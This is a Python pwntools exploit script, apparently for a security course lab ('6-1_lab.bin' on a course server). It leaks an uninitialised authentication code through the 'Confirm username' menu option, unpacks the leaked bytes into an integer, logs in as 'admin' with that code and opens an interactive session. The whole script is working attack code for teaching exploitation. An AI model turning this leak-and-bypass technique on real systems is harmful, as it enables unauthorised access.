''' Script Module Importing '''
from pwn import *

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7061)      # Test Script Against Server
# p = process("./6-1_lab.bin")              # Test Script Locally
# p = gdb.debug("./6-1_lab.bin")            # Debug with GDB

""" ' ' ' ' ' ' ' """
""" get auth code """
""" ' ' ' ' ' ' ' """
'''
Options: (1) Enter username, (2) Confirm username, (3) Done: 2
Current username is: ï¿½
'''
prog_prompt = p.readuntil(b'Done:')                    # Read in Options Menu
print("\n", prog_prompt.decode('utf-8'), "\n")          # Display Options Menu

p.sendline(b"2") 
print(f"[*] Selecting Option (2): Confirm username\n")       # Display Exploit Progress


prog_prompt = p.readuntil(b'is: ')                   # Wait for Program Prompt

auth_code_bytes = p.readline()

#convert to hex and decimal to print
u = make_unpacker(32, endian='little', sign='unsigned')              # Create Unpacker

auth_code_padded = auth_code_bytes.replace(b'\n', b'\x00\x00')      # Padded byte string
auth_code_dec = u(auth_code_padded)     # Decoded as a decimal integer
auth_code_dec_encoded = str(auth_code_dec).encode('utf-8')      # Decimal integer encoded as bytes
auth_code_hex = hex(auth_code_dec)      # Hexadecimal representation of the integer


print(f"[*] Authentication Code Leaked: {auth_code_dec} ({auth_code_hex})\n")       # Display Exploit Progress


""" ' ' ' ' ' ' '  """
""" enter username """
""" ' ' ' ' ' ' '  """
'''
Options: (1) Enter username, (2) Confirm username, (3) Done: 2
Username: Admin

'''

prog_prompt = p.readuntil(b'Done: ')                   # Wait for Program Prompt

p.sendline(b"1") 
print(f"[*] Selecting Option (1): Enter username\n")       # Display Exploit Progress




prog_prompt = p.readuntil(b'Username: ')                   # Wait for Program Prompt

p.sendline(b"admin") 
print(f"[*] Sending username 'admin'\n")       # Display Exploit Progress


""" ' ' ' ' ' ' ' ' ' ' ' ' ' """
""" enter authentication code """
""" ' ' ' ' ' ' ' ' ' ' ' ' ' """
'''
Options: (1) Enter username, (2) Confirm username, (3) Done: 3
Logging in as 'admin'
Enter your authentication code:
'''

prog_prompt = p.readuntil(b'Done: ')                   # Wait for Program Prompt

p.sendline(b"3") 
print(f"[*] Selecting Option (3): Done\n")       # Display Exploit Progress


prog_prompt = p.readuntil(b'\n')                    # Read in Options Menu

prog_prompt = p.readuntil(b'code: ')                   # Wait for Program Prompt

print(f"[*] Sending Authentication Code {str(auth_code_dec)}\n")       # Display Exploit Progress
p.sendline(auth_code_dec_encoded) 


# Start Interactive Session
p.interactive()
